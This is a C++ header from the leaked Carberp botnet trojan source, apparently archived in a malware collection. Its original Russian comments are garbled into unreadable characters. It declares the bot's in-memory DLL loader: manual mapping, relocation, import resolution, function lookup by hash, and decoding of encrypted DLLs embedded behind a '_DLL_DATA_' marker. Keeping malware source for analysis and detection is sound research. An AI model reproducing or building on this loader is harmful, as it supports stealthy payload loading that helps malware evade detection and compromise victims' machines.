/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */

//****************************************************************************
//  ������ ������ � ������������ ������������ � ������
//
//  ������: 1.0.1
//  �������������: ������ 2012
//****************************************************************************


#ifndef DllLoaderH
#define DllLoaderH
//----------------------------------------------------------------------------

#include <windows.h>
#include "GetApi.h"
#include "Strings.h"

typedef void *HMEMORYMODULE;

//-------------------------------------------------------
//  MemoryLoadLibrary - ������� ��������� � ������ ��
//                      ����������� ������ ������
//-------------------------------------------------------
HMEMORYMODULE MemoryLoadLibrary( const void*, bool CallEntryPoint = true, void* param = 0 );


//-------------------------------------------------------
//  MemoryGetProcAddress - ������� ���������� �����
//                     ������� ����������� � ������ DLL
//-------------------------------------------------------
FARPROC MemoryGetProcAddress(HMEMORYMODULE Dll, const char* Name);
FARPROC MemoryGetProcAddress(HMEMORYMODULE Dll, DWORD NameHash);

//-------------------------------------------------------
//  MemoryFreeLibrary - ������� ����������� �������
//                      ���������� ��� DLL � ������
//-------------------------------------------------------
void MemoryFreeLibrary(HMEMORYMODULE);



//-------------------------------------------------------
// ������� ������������ ������� �������
//-------------------------------------------------------
void ProcessRelocation(unsigned char *CodeBase, PIMAGE_NT_HEADERS Headers, DWORD Delta);


void CopySections(LPBYTE data, LPBYTE codeBase, PIMAGE_NT_HEADERS old_headers, PIMAGE_NT_HEADERS new_headers);




//-------------------------------------------------------
//  BuildImport - ������� ������ ������� ������� dll.
//                � ������ ������� � ������ �������
//                �������� �� ���������� ������� �������.
//                ������� ���������� ��� ������� �����
//                ������� ������� ���������� � �������
//                �������.
//-------------------------------------------------------
bool BuildImport(PVOID ImageBase);





//*******************************************************
//  ������ ��� ������ � ������������ DLL
//*******************************************************

//----------------------------------
//  ������ DLL
//----------------------------------
#define ENCRYPTED_DLL_MARKER   "_DLL_DATA_"


//----------------------------------
//  ������ ������� DLL
//----------------------------------
#define ENCRYPTED_DLL_MARKER_SIZE 10

//----------------------------------
//  ��� ������� DLL
//----------------------------------
#define ENCRYPTED_DLL_MARKER_HASH 0x8CAC120C /* _DLL_DATA_ */




//-------------------------------------------------
//  ������� ���������� ���������� � ������
//  ������������� ����������. ������������
//  ���������� ����������
//
//-------------------------------------------------
bool GetEncryptedDLLInfo(LPVOID Buf, LPVOID &StartBuf, DWORD &Size, PCHAR &Password);



//*******************************************************
// TDLL - ����� �������������� ��������, ��������
//        ��������� �� ������
//        ����� ������������� �������������� �����������
//        ����������
//
//  �������� ���������� DLL:
//*******************************************************
class TMemoryDLL : public TBotObject
{
private:
	HMEMORYMODULE FHandle;
	bool   FNotFree; //���� true, �� � ����������� �� ���������� ���
public:
	TMemoryDLL(const void* DllBuf);
	~TMemoryDLL();

	bool Load(const void* DllBuf);

	HMEMORYMODULE inline Handle() { return FHandle; }
	bool		  IsTrue()        { return FHandle != NULL; } //true ���� dll ����������������

	LPVOID        GetProcAddress(const char*   Name);
	LPVOID inline GetProcAddress(const string& Name) { return GetProcAddress(Name.t_str()); }
	LPVOID        GetProcAddress(DWORD   NameHash);
	bool          GetProcAddress(const char*   Name, LPVOID &Addr);
	bool   inline GetProcAddress(const string& Name, LPVOID &Addr) { return GetProcAddress(Name.t_str(), Addr); }
	bool          GetProcAddress(DWORD NameHash, LPVOID &Addr);

	//---------------------------------------------------------
	//  ������� �������������� ���
	//
	//  DllBuf - ��������� �� �������� ����� ���
	//
	//  �������� ���������:
	//
	//  DllSize - ������ �������������� ���
	//  NewBuf  - ��������� �� ����� ���
	//  NewBufAllocated - ����������� � ������, ����
	//                    ��� ������ �������� �������� ������
	//---------------------------------------------------------
	bool static DecodeDll(const void* DllBuf, DWORD &DllSize, LPVOID &NewBuf, bool &NewBufAllocated);

	void SetNotFree( bool v = true )
	{
		FNotFree = v;
	}
};






//----------------------------------------------------------------------------
#endif